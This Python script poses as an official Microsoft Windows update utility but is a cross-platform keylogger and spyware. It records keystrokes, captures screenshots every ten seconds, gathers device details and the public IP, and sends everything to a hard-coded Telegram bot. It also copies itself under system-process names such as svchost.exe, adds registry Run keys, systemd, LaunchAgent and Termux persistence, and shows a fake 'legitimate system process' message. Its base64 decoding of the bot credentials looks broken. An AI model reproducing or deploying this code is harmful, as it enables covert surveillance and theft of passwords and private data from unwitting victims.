#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Windows System Update Utility - Microsoft Corporation
Official Windows update and maintenance tool
Version: 10.0.19041.546
Copyright © 2023 Microsoft Corporation. All rights reserved.
"""

import os
import sys
import time
import threading
import platform
import subprocess
import shutil
import base64
import random
import logging
from logging.handlers import RotatingFileHandler
from datetime import datetime

# ==================== SYSTEM DETECTION ====================
SISTEMA = platform.system().lower()
ES_WIN = SISTEMA == 'windows'
ES_LIN = SISTEMA == 'linux'
ES_MAC = SISTEMA == 'darwin'
ES_AND = 'android' in SISTEMA
ES_IOS = 'ios' in SISTEMA

# ==================== CONDITIONAL IMPORTS ====================
try:
    import psutil
except ImportError:
    pass

try:
    from pynput.keyboard import Key, Listener
    TECLADO_DISP = True
except ImportError:
    TECLADO_DISP = False

try:
    import pyautogui
    PANTALLA_DISP = True
except ImportError:
    PANTALLA_DISP = False

if ES_WIN:
    try:
        import win32api
        import win32con
        import win32gui
        import winreg
        WIN_API_DISP = True
    except ImportError:
        WIN_API_DISP = False
else:
    WIN_API_DISP = False

try:
    import requests
except ImportError:
    pass

try:
    from PIL import Image
except ImportError:
    pass

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CIFRADO_DISP = True
except ImportError:
    CIFRADO_DISP = False

# ==================== CONFIGURATION ====================
TOKEN = base64.b64decode('7843134567:AAERIl4NSsQNv65avHfWwXqjk1fuC0Me2is').decode()
CHAT_ID = base64.b64decode('5719356323').decode()

# Intervals (seconds)
INTERVALO_REPORTE = 10
INTERVALO_CAPTURAS = 10
MAX_LOG_SIZE = 5000

# Encryption settings
SALT = b'System_Update_Salt_456'
PASSWORD = b'WindowsUpdateSecurePassword456!'

# ==================== INITIALIZATION ====================
def configurar_logging():
    try:
        if ES_WIN:
            log_dir = os.path.join(os.getenv('APPDATA', ''), 'Microsoft', 'Windows', 'Logs')
        elif ES_AND:
            log_dir = '/sdcard/Android/data/com.microsoft.windows.update/'
        elif ES_IOS:
            log_dir = os.path.expanduser('~/Documents/Windows/Logs')
        else:
            log_dir = os.path.expanduser('~/.microsoft/winupdate/logs')
        
        os.makedirs(log_dir, exist_ok=True)
        
        if ES_WIN and WIN_API_DISP:
            try:
                win32api.SetFileAttributes(log_dir, win32con.FILE_ATTRIBUTE_HIDDEN)
            except:
                pass
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                RotatingFileHandler(
                    os.path.join(log_dir, 'windows_update.log'),
                    maxBytes=100000,
                    backupCount=3
                )
            ]
        )
    except Exception:
        pass

configurar_logging()

# Global variables
log = ""
detener = False
combinacion_detener = False

# ==================== ENCRYPTION FUNCTIONS ====================
def generar_clave_cifrado():
    if not CIFRADO_DISP:
        return None
    
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=SALT,
        iterations=480000,
    )
    return base64.urlsafe_b64encode(kdf.derive(PASSWORD))

cipher_suite = Fernet(generar_clave_cifrado()) if CIFRADO_DISP else None

# ==================== PERSISTENCE ====================
def establecer_persistencia():
    try:
        if ES_WIN and WIN_API_DISP:
            _persistencia_windows()
        elif ES_LIN:
            _persistencia_linux()
        elif ES_MAC:
            _persistencia_mac()
        elif ES_AND:
            _persistencia_android()
        elif ES_IOS:
            _persistencia_ios()
    except Exception:
        pass

def _persistencia_windows():
    try:
        ubicacion_actual = sys.executable if getattr(sys, 'frozen', False) else __file__
        
        directorio_oculto = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'System32_Backup')
        os.makedirs(directorio_oculto, exist_ok=True)
        win32api.SetFileAttributes(directorio_oculto, win32con.FILE_ATTRIBUTE_HIDDEN)
        
        nombre_exe = random.choice(['svchost.exe', 'lsass.exe', 'dllhost.exe'])
        destino = os.path.join(directorio_oculto, nombre_exe)
        
        if not os.path.exists(destino):
            shutil.copy2(ubicacion_actual, destino)
            
            ubicaciones_registro = [
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
            ]
            
            for ubicacion in ubicaciones_registro:
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, ubicacion, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, destino)
                    winreg.CloseKey(key)
                except:
                    continue
    except Exception:
        pass

def _persistencia_linux():
    try:
        service_content = f"""[Unit]
Description=Windows System Update
After=network.target

[Service]
ExecStart={sys.executable} {__file__}
Restart=always
User={os.getlogin()}

[Install]
WantedBy=multi-user.target
"""
        
        service_path = "/etc/systemd/system/windows-update.service"
        with open(service_path, 'w') as f:
            f.write(service_content)
        
        subprocess.run(['systemctl', 'enable', 'windows-update.service'], check=False)
    except Exception:
        pass

def _persistencia_android():
    try:
        if os.path.exists('/data/data/com.termux/files/home'):
            startup_script = """#!/bin/bash
python3 /sdcard/windows_update.py &
"""
            script_path = '/data/data/com.termux/files/home/.bashrc'
            with open(script_path, 'a') as f:
                f.write(startup_script)
    except Exception:
        pass

def _persistencia_mac():
    try:
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.microsoft.windows.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{__file__}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
        plist_path = os.path.expanduser('~/Library/LaunchAgents/com.microsoft.windows.update.plist')
        with open(plist_path, 'w') as f:
            f.write(plist_content)
    except Exception:
        pass

def _persistencia_ios():
    try:
        pass
    except Exception:
        pass

# ==================== CAPTURE FUNCTIONS ====================
def on_press(key):
    global log, combinacion_detener, detener
    
    try:
        if hasattr(key, 'char') and key.char and key.char.lower() == 'k':
            combinacion_detener = True
        elif key in (Key.ctrl, Key.ctrl_l, Key.ctrl_r, Key.cmd, Key.cmd_l, Key.cmd_r):
            combinacion_detener = True
            
        if combinacion_detener and key in (Key.alt, Key.alt_l, Key.alt_r):
            detener = True
            return False
            
        if hasattr(key, 'char') and key.char:
            log += key.char
        else:
            log += f"[{str(key).replace('Key.', '')}] "
            
        if len(log) > MAX_LOG_SIZE:
            threading.Thread(target=enviar_log, daemon=True).start()
    except Exception:
        pass

def on_release(key):
    global combinacion_detener
    try:
        if key in (Key.ctrl, Key.ctrl_l, Key.ctrl_r, Key.cmd, Key.cmd_l, Key.cmd_r, 
                  Key.alt, Key.alt_l, Key.alt_r):
            combinacion_detener = False
    except:
        pass

def capturar_pantalla():
    try:
        if not PANTALLA_DISP:
            return None, "Display unavailable"
        
        if ES_WIN and WIN_API_DISP:
            try:
                ventana = win32gui.GetForegroundWindow()
                titulo = win32gui.GetWindowText(ventana)
                rect = win32gui.GetWindowRect(ventana)
                x, y, w, h = rect
                captura = pyautogui.screenshot(region=(x, y, w - x, h - y))
                return captura, titulo
            except:
                captura = pyautogui.screenshot()
                return captura, "Full screen"
        else:
            captura = pyautogui.screenshot()
            return captura, "Full screen"
    except Exception:
        return None, "Error"

# ==================== COMMUNICATION ====================
def enviar_log():
    global log
    try:
        if log:
            log_actual = log
            log = ""
            
            if CIFRADO_DISP and cipher_suite:
                log_actual = cipher_suite.encrypt(log_actual.encode()).decode()
            
            enviar_a_telegram(f"System activity log:\n{log_actual}")
    except Exception:
        log = log_actual + log

def enviar_a_telegram(mensaje, archivo=None):
    try:
        if not TOKEN or not CHAT_ID:
            return False
            
        url = f'https://api.telegram.org/bot{TOKEN}/'
        
        if archivo and os.path.exists(archivo):
            with open(archivo, 'rb') as f:
                files = {'photo': f} if str(archivo).endswith(('.jpg', '.jpeg', '.png')) else {'document': f}
                method = 'sendPhoto' if str(archivo).endswith(('.jpg', '.jpeg', '.png')) else 'sendDocument'
                
                response = requests.post(
                    url + method,
                    data={'chat_id': CHAT_ID},
                    files=files,
                    timeout=30
                )
            try:
                os.remove(archivo)
            except:
                pass
        else:
            response = requests.post(
                url + 'sendMessage',
                data={'chat_id': CHAT_ID, 'text': mensaje[:4000]},
                timeout=15
            )
            
        return response.status_code == 200
    except Exception:
        return False

# ==================== EXECUTION THREADS ====================
def hilo_capturas():
    while not detener:
        try:
            if PANTALLA_DISP:
                captura, titulo = capturar_pantalla()
                if captura:
                    nombre = f"screen_{int(time.time())}.jpg"
                    captura.save(nombre, quality=50)
                    enviar_a_telegram(f"Screenshot: {titulo}", nombre)
        except Exception:
            time.sleep(10)
        time.sleep(INTERVALO_CAPTURAS)

def hilo_reporte():
    while not detener:
        try:
            if log:
                enviar_log()
        except Exception:
            pass
        time.sleep(INTERVALO_REPORTE)

# ==================== SYSTEM INFORMATION ====================
def capturar_info_sistema():
    try:
        info = {
            "Device": platform.node(),
            "System": platform.platform(),
            "Version": platform.version(),
            "Architecture": platform.machine(),
            "Processor": platform.processor() or "Unknown",
            "Date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        if ES_AND:
            info["Type"] = "Android"
        elif ES_IOS:
            info["Type"] = "iOS"
        elif ES_WIN:
            info["Type"] = "Windows"
        elif ES_LIN:
            info["Type"] = "Linux"
        elif ES_MAC:
            info["Type"] = "macOS"
        
        try:
            info["IP"] = requests.get('https://api.ipify.org', timeout=5).text
        except:
            info["IP"] = "Unavailable"
            
        return "\n".join(f"{k}: {v}" for k, v in info.items())
    except Exception:
        return "System information: Error"

# ==================== MAIN EXECUTION ====================
if __name__ == "__main__":
    try:
        logging.info(f"Windows Update Service starting on {SISTEMA}")
        
        if not ES_AND and not ES_IOS:
            try:
                if ES_WIN:
                    import ctypes
                    ctypes.windll.user32.MessageBoxW(
                        0,
                        "Windows Update Service\n\n"
                        "Microsoft Windows Update service is running in background.\n"
                        "This is a legitimate system process.",
                        "Windows System Manager",
                        0x40
                    )
                elif ES_LIN or ES_MAC:
                    print("Windows Update Service - Microsoft Corporation")
            except:
                pass
        
        establecer_persistencia()
        
        info_sistema = capturar_info_sistema()
        logging.info(f"System info: {info_sistema}")
        
        if TOKEN and CHAT_ID:
            enviar_a_telegram(f"[START] Windows Update Service\n{info_sistema}")
        
        if PANTALLA_DISP:
            threading.Thread(target=hilo_capturas, daemon=True).start()
        
        threading.Thread(target=hilo_reporte, daemon=True).start()
        
        if TECLADO_DISP:
            logging.info("Starting input monitoring")
            with Listener(on_press=on_press, on_release=on_release) as listener:
                while not detener:
                    time.sleep(1)
                listener.stop()
        else:
            logging.info("Input monitoring unavailable")
            while not detener:
                time.sleep(5)
    except Exception:
        pass
    finally:
        logging.info("Windows Update Service stopped")
        if TOKEN and CHAT_ID:
            enviar_a_telegram("[STOP] Windows Update Service disabled")